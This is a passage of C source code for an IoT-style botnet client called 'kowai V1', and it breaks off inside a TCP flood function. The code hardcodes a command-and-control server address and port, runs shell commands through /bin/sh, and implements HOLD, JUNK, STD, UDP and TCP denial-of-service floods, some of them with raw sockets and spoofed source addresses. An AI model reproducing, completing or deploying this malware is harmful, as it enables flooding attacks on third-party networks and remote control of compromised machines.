/*
8  dP .d88b. Yb        dP    db    888 
8wdP  8P  Y8  Yb  db  dP    dPYb    8  
88Yb  8b  d8   YbdPYbdP    dPwwYb   8  
8  Yb `Y88P'    YP  YP    dP    Yb 888

*/
#define PHI 0x9e3779b9
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define STD2_SIZE 420
#define BUFFER_SIZE 1024
#define VERSION "kowai V1"
#define ECHOBIN "slumpthegod"
#define BINDIR "/"

#define TRUE 1
#define FALSE 0

#define SIG_BLOCK "NAME"

#include <dirent.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
//#include "killer.c" // That spooky killer by slump

#include <stdio.h>

//

unsigned char *cncip = "178.128.154.119";
int cncport = 1994;

int pgid;

//

const char * useragents[] = {
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
  "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
  "Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
  "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
  "Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
  "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
  "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
  "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
  "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
  "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
  "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
};

struct killerinfo {
	char *writedir;
};
unsigned char *fdgets(unsigned char *, int, int);
int initConnection();
int getBogos(unsigned char * bogomips);
int getCores();
int getCountry(unsigned char * buf, int bufsize);
void makeRandomStr(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);
char * inet_ntoa(struct in_addr in );
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t * pids;
int rangechoice = 1;
int hacked = 0;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
  0
};
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
void trim(char * str) {
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}

static int * fdopen_pids;

int fdpopen(unsigned char * program, register unsigned char * type) {
  register int iop;
  int pdes[2], fds, pid;

  if ( * type != 'r' && * type != 'w' || type[1]) return -1;

  if (pipe(pdes) < 0) return -1;
  if (fdopen_pids == NULL) {
    if ((fds = getdtablesize()) <= 0) return -1;
    if ((fdopen_pids = (int * ) malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
    memset((unsigned char * ) fdopen_pids, 0, fds * sizeof(int));
  }

  switch (pid = vfork()) {
  case -1:
    close(pdes[0]);
    close(pdes[1]);
    return -1;
  case 0:
    if ( * type == 'r') {
      if (pdes[1] != 1) {
        dup2(pdes[1], 1);
        close(pdes[1]);
      }
      close(pdes[0]);
    } else {
      if (pdes[0] != 0) {
        (void) dup2(pdes[0], 0);
        (void) close(pdes[0]);
      }
      (void) close(pdes[1]);
    }
    execl("/bin/sh", "sh", "-c", program, NULL);
    _exit(127);
  }
  if ( * type == 'r') {
    iop = pdes[0];
    (void) close(pdes[1]);
  } else {
    iop = pdes[1];
    (void) close(pdes[0]);
  }
  fdopen_pids[iop] = pid;
  return (iop);
}

int fdpclose(int iop) {
  register int fdes;
  sigset_t omask, nmask;
  int pstat;
  register int pid;

  if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
  (void) close(iop);
  sigemptyset( & nmask);
  sigaddset( & nmask, SIGINT);
  sigaddset( & nmask, SIGQUIT);
  sigaddset( & nmask, SIGHUP);
  (void) sigprocmask(SIG_BLOCK, & nmask, & omask);
  do {
    pid = waitpid(fdopen_pids[iop], (int * ) & pstat, 0);
  } while (pid == -1 && errno == EINTR);
  (void) sigprocmask(SIG_SETMASK, & omask, NULL);
  fdopen_pids[fdes] = 0;
  return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char * buffer, int bufferSize, int fd) {
  int got = 1, total = 0;
  while (got == 1 && total < bufferSize && * (buffer + total - 1) != '\n') {
    got = read(fd, buffer + total, 1);
    total++;
  }
  return got == 0 ? NULL : buffer;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char * hex) {
  long ret = 0;
  while ( * hex && ret >= 0) ret = (ret << 4) | hextable[ * hex++];
  return ret;
}

int wildString(const unsigned char * pattern,
  const unsigned char * string) {
  switch ( * pattern) {
  case '\0':
    return *string;
  case '*':
    return !(!wildString(pattern + 1, string) || * string && !wildString(pattern, string + 1));
  case '?':
    return !( * string && !wildString(pattern + 1, string + 1));
  default:
    return !((toupper( * pattern) == toupper( * string)) && !wildString(pattern + 1, string + 1));
  }
}

int getHost(unsigned char * toGet, struct in_addr * i) {
  struct hostent * h;
  if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
  return 0;
}

void uppercase(unsigned char * str) {
  while ( * str) { * str = toupper( * str);
    str++;
  }
}

void makeRandomStr(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}

int recvLine(int socket, unsigned char * buf, int bufsize) {
  memset(buf, 0, bufsize);

  fd_set myset;
  struct timeval tv;
  tv.tv_sec = 30;
  tv.tv_usec = 0;
  FD_ZERO( & myset);
  FD_SET(socket, & myset);
  int selectRtn, retryCount;
  if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
    while (retryCount < 10) {
      sockprintf(mainCommSock, "PING");

      tv.tv_sec = 30;
      tv.tv_usec = 0;
      FD_ZERO( & myset);
      FD_SET(socket, & myset);
      if ((selectRtn = select(socket + 1, & myset, NULL, & myset, & tv)) <= 0) {
        retryCount++;
        continue;
      }

      break;
    }
  }

  unsigned char tmpchr;
  unsigned char * cp;
  int count = 0;

  cp = buf;
  while (bufsize-- > 1) {
    if (recv(mainCommSock, & tmpchr, 1, 0) != 1) { * cp = 0x00;
      return -1;
    } * cp++ = tmpchr;
    if (tmpchr == '\n') break;
    count++;
  } * cp = 0x00;

  return count;
}

int listFork() {
  uint32_t parent, * newpids, i;
  parent = fork();
  if (parent <= 0) return parent;
  numpids++;
  newpids = (uint32_t * ) malloc((numpids + 1) * 4);
  for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
  newpids[numpids - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short * buf, int count) {
  register uint64_t sum = 0;
  while (count > 1) {
    sum += * buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += * (unsigned char * ) buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr * iph, struct tcphdr * tcph) {

  struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
  }
  pseudohead;
  unsigned short total_len = iph->tot_len;
  pseudohead.src_addr = iph->saddr;
  pseudohead.dst_addr = iph->daddr;
  pseudohead.zero = 0;
  pseudohead.proto = IPPROTO_TCP;
  pseudohead.length = htons(sizeof(struct tcphdr));
  int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
  unsigned short * tcp = malloc(totaltcp_len);
  memcpy((unsigned char * ) tcp, & pseudohead, sizeof(struct tcp_pseudo));
  memcpy((unsigned char * ) tcp + sizeof(struct tcp_pseudo), (unsigned char * ) tcph, sizeof(struct tcphdr));
  unsigned short output = csum(tcp, totaltcp_len);
  free(tcp);
  return output;
}

void makeIPPacket(struct iphdr * iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + packetSize;
  iph->id = rand_cmwc();
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = protocol;
  iph->check = 0;
  iph->saddr = source;
  iph->daddr = dest;
}

int sclose(int fd) {
  if (3 > fd) return 1;
  close(fd);
  return 0;
}
int socket_connect(char * host, in_port_t port) {
  struct hostent * hp;
  struct sockaddr_in addr;
  int on = 1, sock;
  if ((hp = gethostbyname(host)) == NULL) return 0;
  bcopy(hp->h_addr, & addr.sin_addr, hp->h_length);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));
  if (sock == -1) return 0;
  if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
    return 0;
  return sock;
}
  //Sends HOLD Flood
void sendHOLD(unsigned char * ip, int port, int end_time) {
  int max = getdtablesize() / 2, i;
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(port);
  if (getHost(ip, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
  struct state_t {
    int fd;
    uint8_t state;
  }
  fds[max];
  memset(fds, 0, max * (sizeof(int) + 1));
  fd_set myset;
  struct timeval tv;
  socklen_t lon;
  int valopt, res;
  unsigned char * watwat = malloc(1024);
  memset(watwat, 0, 1024);
  int end = time(NULL) + end_time;
  while (end > time(NULL)) {
    for (i = 0; i < max; i++) {
      switch (fds[i].state) {
      case 0:
        {
          fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
          fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
          if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
          else fds[i].state = 1;
        }
        break;
      case 1:
        {
          FD_ZERO( & myset);
          FD_SET(fds[i].fd, & myset);
          tv.tv_sec = 0;
          tv.tv_usec = 10000;
          res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
          if (res == 1) {
            lon = sizeof(int);
            getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
            if (valopt) {
              close(fds[i].fd);
              fds[i].state = 0;
            } else {
              fds[i].state = 2;
            }
          } else if (res == -1) {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;
      case 2:
        {
          FD_ZERO( & myset);
          FD_SET(fds[i].fd, & myset);
          tv.tv_sec = 0;
          tv.tv_usec = 10000;
          res = select(fds[i].fd + 1, NULL, NULL, & myset, & tv);
          if (res != 0) {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;
      }
    }
  }
}
void sendJUNK(unsigned char * ip, int port, int end_time) {

  int max = getdtablesize() / 2, i;

  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(port);
  if (getHost(ip, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  struct state_t {
    int fd;
    uint8_t state;
  }
  fds[max];
  memset(fds, 0, max * (sizeof(int) + 1));

  fd_set myset;
  struct timeval tv;
  socklen_t lon;
  int valopt, res;

  unsigned char * watwat = malloc(1024);
  memset(watwat, 0, 1024);

  int end = time(NULL) + end_time;
  while (end > time(NULL)) {
    for (i = 0; i < max; i++) {
      switch (fds[i].state) {
      case 0:
        {
          fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
          fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
          if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
          else fds[i].state = 1;
        }
        break;

      case 1:
        {
          FD_ZERO( & myset);
          FD_SET(fds[i].fd, & myset);
          tv.tv_sec = 0;
          tv.tv_usec = 10000;
          res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
          if (res == 1) {
            lon = sizeof(int);
            getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
            if (valopt) {
              close(fds[i].fd);
              fds[i].state = 0;
            } else {
              fds[i].state = 2;
            }
          } else if (res == -1) {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;

      case 2:
        {
          makeRandomStr(watwat, 1024);
          if (send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;
      }
    }
  }
}
void sendSTD(unsigned char * ip, int port, int secs) {
    int sock;
	int spid;
	
	spid = fork();
	if(spid > 0 || spid < 1)
		return;
	
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
	int power = 450;
    while(1) {
		char *randstrings[] = {"arfgG", "HBiug655", "KJYDFyljf754", "LIKUGilkut769458905", "JHFDSkgfc5747694", "GJjyur67458", "RYSDk747586", "HKJGi5r8675", "KHGK7985i", "yuituiILYF", "GKJDghfcjkgd4", "uygtfgtrevf", "tyeuhygbtfvg", "ewqdcftr", "trbazetghhnbrty", "tbhrwsehbg", "twehgbferhb", "etrbhhgetrb", "edfverthbyrtb", "kmiujmnhnhfgn", "zcdbvgdfsbgfd", "gdfbtsdgb", "ghdugffytsdyt", "tgerthgwtrwry", "yteytietyue", "qsortEQS", "8969876hjkghblk", "std", "dts", "lsk", "kek", "smack", "ily", "tyf", "pos", "cunts"};
        char *std_string = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
        if (a >= 50)
        {
            send(sock, std_string, power, 0);
            connect(sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(sock);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendUDP(unsigned char * target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  register unsigned int pollRegister;
  pollRegister = pollinterval;

  if (spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (!sockfd) {
      sockprintf(mainCommSock, "Failed opening raw socket.");
      return;
    }

    unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
    if (buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, buf, packetsize, 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      if (i == pollRegister) {
        if (port == 0) dest_addr.sin_port = rand_cmwc();
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;
      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (!sockfd) {
      sockprintf(mainCommSock, "Failed opening raw socket.");
      return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
      sockprintf(mainCommSock, "Failed setting raw headers mode.");
      return;
    }

    int counter = 50;
    while (counter--) {
      srand(time(NULL) ^ rand_cmwc());
      init_rand(rand());
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr * iph = (struct iphdr * ) packet;
    struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(GetRandomIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

    udph->len = htons(sizeof(struct udphdr) + packetsize);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;

    makeRandomStr((unsigned char * )(((unsigned char * ) udph) + sizeof(struct udphdr)), packetsize);

    iph->check = csum((unsigned short * ) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while (1) {
      sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

      udph->source = rand_cmwc();
      udph->dest = (port == 0 ? rand_cmwc() : htons(port));
      iph->id = rand_cmwc();
      iph->saddr = htonl(GetRandomIP(netmask));
      iph->check = csum((unsigned short * ) packet, iph->tot_len);

      if (i == pollRegister) {
        if (time(NULL) > end) break;
        i = 0;
        continue;
      }
      i++;

      if (ii == sleepcheck) {
        usleep(sleeptime * 1000);
        ii = 0;
        continue;
      }
      ii++;
    }
  }
}

void sendTCP(unsigned char * target, int port, int timeEnd, int spoofit, unsigned char * flags, int packetsize, int pollinterval) {
  register unsigned int pollRegister;
  pollRegister = pollinterval;

  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  if (port == 0) dest_addr.sin_port = rand_cmwc();
  else dest_addr.sin_port = htons(port);
  if (getHost(target, & dest_addr.sin_addr)) return;
  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (!sockfd) {
    sockprintf(mainCommSock, "Failed opening raw socket.");
    return;
  }

  int tmp = 1;
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
    sockprintf(mainCommSock, "Failed setting raw headers mode.");
    return;
  }

  in_addr_t netmask;

  if (spoofit == 0) netmask = (~((in_addr_t) - 1));
  else netmask = (~((1 << (32 - spoofit)) - 1));

  unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
  struct iphdr * iph = (struct iphdr * ) packet;
  struct tcphdr * tcph = (void * ) iph + sizeof(struct iphdr);

  makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(GetRandomIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

  tcph->source = rand_cmwc();
  tcph->seq = rand_cmwc();
  tcph->ack_seq = 0;
  tcph->doff = 5;

  if (!strcmp(flags, "all")) {
    tcph->syn = 1;
    tcph->rst = 1;
    tcph->fin = 1;
    tcph->ack = 1;
    tcph->psh = 1;
  } else {
    unsigned char * pch = strtok(flags, ",");
    while (pch) {
      if (!strcmp(pch, "syn")) {
        tcph->syn = 1;
      } else if (!strcmp(pch, "rst")) {
        tcph->rst = 1;
      } else if (!strcmp(pch, "fin")) {
        tcph->fin = 1;
      } else if (!strcmp(pch, "ack")) {
        tcph->ack = 1;
      } else if (!strcmp(pch, "psh")) {
        tcph->psh = 1;
      } else {
        sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
      }
      pch = strtok(NULL, ",");
    }
  }

  tcph->window = rand_cmwc();
  tcph->check = 0;
  tcph->urg_ptr = 0;
  tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
  tcph->check = tcpcsum(iph, tcph);

  iph->check = csum((unsigned short * ) packet, iph->tot_len);

  int end = time(NULL) + timeEnd;
  register unsigned int i = 0;
  while (1) {
